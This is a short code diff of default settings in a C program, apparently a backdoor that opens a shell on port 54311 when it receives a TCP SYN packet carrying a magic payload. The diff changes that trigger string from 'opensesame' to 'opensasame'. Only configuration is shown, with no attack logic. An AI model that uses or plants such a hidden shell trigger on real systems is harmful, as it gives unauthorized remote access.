@@ -44,7 +44,7 @@
 /* default values */
 #define DEF_HOST        "ANY"           /* default allowed host */
 #define DEF_TYPE        _TCP_SYN_TYPE   /* packet/protocol type */
-#define DEF_PAYLOAD     "opensesame"    /* magic payload */
+#define DEF_PAYLOAD     "opensasame"    /* magic payload */
 #define DEF_BYE_PAYLOAD "byebye"        /* magic BYE payload */
 #define DEF_PORT        54311           /* port for shell */
 
